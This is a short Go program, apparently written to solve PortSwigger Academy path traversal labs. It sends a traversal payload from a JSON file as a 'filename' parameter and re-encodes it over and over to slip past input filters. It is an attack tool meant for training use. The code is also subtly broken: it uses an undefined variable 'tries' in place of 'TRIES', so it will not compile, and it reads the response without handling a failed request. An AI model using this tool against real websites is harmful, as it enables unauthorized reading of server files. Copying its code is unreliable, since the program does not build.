// Function - Solve all the labs from PortSwigger's Academy Path Traversal module
// Author - Ray
// Caution - Use this code to learn and not against other peoples websites
package main

import (
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

func main() {
	m := readJsonFile(os.Args[1])
	fmt.Println(m)
	fmt.Println(solveLab(m))
}

// readJsonFile will attempt to read the *.json file provided as first argument
// then it will decode the json file and create a map out it
func readJsonFile(path string) map[string]string {
	file, err := os.Open(path)
	if err != nil {
		log.Fatal("error opening file", err)
	}
	defer file.Close()

	dataBytes, err := io.ReadAll(file)
	if err != nil {
		log.Println("error reading file:", err)
	}

	x, _ := file.Stat()
	fmt.Println("file size is", x.Size())
	m := make(map[string]string)

	err = json.Unmarshal(dataBytes, &m)
	if err != nil {
		log.Println("error unmarshalling json", err)
	}

	return m
}

var TRIES = 0
var MAX_TRIES = 4

func solveLab(m map[string]string) string {
	// ensure method is always uppercase
	method := strings.ToUpper(m["method"])

	parsedUrl, err := url.Parse(m["host"])
	if err != nil {
		log.Println("error parsing url", err)
	}

	query := parsedUrl.Query()
	query.Add("filename", m["payload"])
	parsedUrl.RawQuery = query.Encode()

	req, _ := http.NewRequest(method, parsedUrl.String(), nil)

	cookie := &http.Cookie{}
	cookie.Name = "cookie"
	cookie.Value = m["cookie"]
	req.AddCookie(cookie)

	c := &http.Client{
		Timeout: time.Second * 30,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				NextProtos: []string{"http/1.1"},
			},
		},
	}
	resp, err := c.Do(req)

	if err != nil {
		log.Println("error making request", err)
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if resp.StatusCode != 200 {
		if TRIES > MAX_TRIES {
			return fmt.Sprintf("tried %d times and failed", tries)
		}
		TRIES++
		m["payload"] = encodeWithDepth(m["payload"], tries)
		return solveLab(m)
	}
	return string(body)
}

func encodeWithDepth(input string, depth int) string {
	i := 0
	for i != depth {
		input = url.QueryEscape(input)
		i++
	}
	return input
}
